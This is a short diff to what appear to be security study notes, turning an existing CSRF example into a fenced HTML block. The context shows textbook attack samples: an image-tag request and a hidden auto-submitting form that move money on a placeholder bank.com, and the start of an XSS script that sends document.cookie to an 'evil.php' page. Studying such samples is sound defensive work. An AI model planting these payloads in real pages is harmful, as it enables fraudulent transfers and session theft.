@@ -120,11 +120,13 @@
 			- `<img src="http://bank.com/transfer.do?acct=MARIA&amount=100000" width="0" height="0" border="0">`
 		- POST http://bank.com/transfer.do HTTP/1.1
 		  acct=BOB&amount=100
-		- `<form action="http://bank.com/transfer.do" method="POST">
+		- ```html
+		  <form action="http://bank.com/transfer.do" method="POST">
 		  <input type="hidden" name="acct" value="MARIA"/>
 		  <input type="hidden" name="amount" value="100000"/>
 		  <input type="submit" value="View my pictures"/>
-		  </form>`
+		  </form>
+		  ```
 	- XSS
 		- <SCRIPT type="text/javascript">
 		  var adr = '../evil.php?cakemonster=' + escape(document.cookie);
